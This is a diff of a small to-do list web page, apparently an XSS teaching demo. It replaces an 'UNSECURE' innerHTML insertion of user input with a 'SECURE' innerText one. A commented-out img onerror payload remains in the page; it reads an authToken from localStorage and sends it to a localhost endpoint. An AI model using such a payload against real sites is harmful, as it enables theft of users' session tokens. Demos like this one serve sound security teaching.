@@ -24,30 +24,30 @@
         const todoList = document.querySelector("#todoList");
         const todo = document.querySelector("#todo");
         const button = document.querySelector("#add");
-        
+
         button.addEventListener('click', () => {
             const todoItem = document.createElement('li');
             if (!todo.value.trim()) {
                 return;
             }
-        
+
             todoItem.classList.add('list-group-item');
             // UNSECURE
             // TRY script alert
             // TRY img onerror
-            todoItem.innerHTML = `${todo.value}`;
-        
+            // todoItem.innerHTML = `${todo.value}`;
+
             // SECURE
-            //todoItem.innerText = `${todo.value}`;
-        
+            todoItem.innerText = `${todo.value}`;
+
             todoList.appendChild(todoItem);
             todo.value = "";
-        
-        
+
+
         })
-        
-        //<img src="x" onerror="const authToken = localStorage.getItem('authToken');const url = `http://localhost:3000/saveToken?authToken=${encodeURIComponent(authToken)}`;fetch(url).then(response => {if (response.ok) {console.log('Token inviato con successo!');} else {console.error('Errore durante l\'invio del token');}}).catch(error => console.error('Errore di rete:', error));">
-        
+
+        //<img src="x" onerror="const authToken = localStorage.getItem('authToken');const url = `http://localhost:5500/saveToken?authToken=${encodeURIComponent(authToken)}`;fetch(url).then(response => {if (response.ok) {console.log('Token inviato con successo!');} else {console.error('Errore durante l\'invio del token');}}).catch(error => console.error('Errore di rete:', error));">
+
     </script>
 </body>
 
